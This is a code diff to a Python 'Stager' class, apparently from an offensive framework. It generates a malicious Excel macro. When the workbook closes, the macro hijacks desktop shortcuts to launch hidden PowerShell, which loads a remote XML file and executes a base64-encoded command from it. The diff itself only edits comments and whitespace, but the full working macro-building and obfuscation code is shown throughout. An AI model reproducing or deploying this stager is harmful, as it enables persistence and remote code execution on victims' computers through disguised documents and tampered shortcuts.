@@ -93,7 +93,7 @@ class Stager:
 
 
 
-    #function to convert row + col coords (ex. 30, 40) into excel cells (ex. 30,40 -> AE40)
+    #function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
     @staticmethod
     def coordsToCell(row,col):
 	coords = ""
@@ -105,9 +105,6 @@ class Stager:
 		coords = coords + 'Z'
 	coords = coords + str(row+1)
 	return coords
-
-
-
 
 
     def generate(self):
@@ -125,7 +122,6 @@ class Stager:
 	XmlOut = self.options['XmlOutFile']['Value']
 	targetEXE = targetEXE.split(',')
 	targetEXE = filter(None,targetEXE)
-
 
 	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
@@ -161,27 +157,22 @@ class Stager:
 	    #build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
             macro = "Sub Auto_Close()\n"
 	
-
+		#writes strings + payload to cells of the target XLS doc
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
 	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
 	    inputCol = inputCol + random.randint(1,4)
-
-
 
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Scripting.FileSystemObject"))
 	    macro += "Set "+ fsoVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
 	    inputCol = inputCol + random.randint(1,4)
 
-
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("desktop"))
 	    macro += "Set " + folderVar + " = " + fsoVar + ".GetFolder(" + shellVar + ".SpecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value))\n"	
 	    macro += "For Each " + fileVar + " In " + folderVar + ".Files\n"
 
-
 	    macro += "If(InStr(Lcase(" + fileVar + "), \".lnk\")) Then\n"
 	    macro += "Set " + lnkVar + " = " + shellVar + ".CreateShortcut(" + shellVar + ".SPecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value) & \"\\\" & " + fileVar + ".name)\n"
 	    inputCol = inputCol + random.randint(1,4)
-
 	
 	    macro += "If("
 	    for i, item in enumerate(targetEXE):
@@ -192,14 +183,12 @@ class Stager:
 		inputCol = inputCol + random.randint(1,4)
 	    macro += ") Then\n"
 
-	    
- 
+	    #setup of payload, the multiple strings are assemled at runtime 
 	    launchString1 = "hidden -nop -command \"[System.Diagnostics.Process]::Start(\'"
 	    launchString2 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName); if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;$b.Load(\'" 
 	    launchString3 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\""
 	    
-	    
-
+	  
 	    #part of the macro that actually modifies the LNK files on the desktop, sets iconlocation for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
 	    macro += lnkVar + ".IconLocation = " + lnkVar + ".targetpath\n"
 	   
@@ -216,8 +205,6 @@ class Stager:
 	    inputCol = inputCol + random.randint(1,4)
 
 	    macro += lnkVar + ".arguments = \"-w \" + activeSheet.Range(\""+ launch1Coords +"\").Value + " + lnkVar + ".targetPath" + " + activeSheet.Range(\""+ launch4Coords +"\").Value" + "\n"
-
-
 
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization(":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
 	    macro += lnkVar + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) + activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value\n"
